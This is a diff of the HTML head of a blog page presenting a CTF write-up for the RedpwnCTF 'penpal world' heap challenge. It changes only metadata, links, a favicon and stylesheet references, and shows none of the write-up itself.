@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
+  
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
@@ -15,20 +16,20 @@
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
   <meta http-equiv="window-target" content="_top">
   
+  
   <title>[Pwn] RedpwnCTF - penpal world | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="penpal world   Description:436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010penpal_worldlibc-2.27.">
+  <meta name="description" content="penpal world   Description: 436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010 penpal_world libc-2.">
 <meta name="keywords" content="double_free,use_after_free,tcache_poisoning,heap,redpwnctf2017">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] RedpwnCTF - penpal world">
 <meta property="og:url" content="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="penpal world   Description:436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010penpal_worldlibc-2.27.">
+<meta property="og:description" content="penpal world   Description: 436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010 penpal_world libc-2.">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/qwc5RCS.png">
 <meta property="og:image" content="https://i.imgur.com/I0EbIyy.png">
 <meta property="og:image" content="https://i.imgur.com/bcLTouv.png">
 <meta property="og:image" content="https://i.imgur.com/uZr1mzH.png">
-<meta property="og:image" content="https://i.imgur.com/yxHU7rd.png">
 <meta property="og:image" content="https://i.imgur.com/brUzymx.png">
 <meta property="og:image" content="https://i.imgur.com/bZTPxZ1.png">
 <meta property="og:image" content="https://i.imgur.com/iWd1MMW.png">
@@ -36,7 +37,6 @@
 <meta property="og:image" content="https://i.imgur.com/kjCR5aR.png">
 <meta property="og:image" content="https://i.imgur.com/Ya6ZWlt.png">
 <meta property="og:image" content="https://i.imgur.com/uGz3Eu9.png">
-<meta property="og:image" content="https://i.imgur.com/Ir1dvEf.png">
 <meta property="og:image" content="https://i.imgur.com/biRvmS1.png">
 <meta property="og:image" content="https://i.imgur.com/OqsTjG3.png">
 <meta property="og:image" content="https://i.imgur.com/ropfJc7.png">
@@ -44,36 +44,39 @@
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] RedpwnCTF - penpal world">
-<meta name="twitter:description" content="penpal world   Description:436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010penpal_worldlibc-2.27.">
+<meta name="twitter:description" content="penpal world   Description: 436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010 penpal_world libc-2.">
 <meta name="twitter:image" content="https://i.imgur.com/qwc5RCS.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/index.html">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
   
     <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
   
-  <!-- font-awesome CSS -->
-  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  
-  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-
   <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
 </head>
-</html>
 
-<body class="main-center">
-  <section class="mainside">
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
       
       
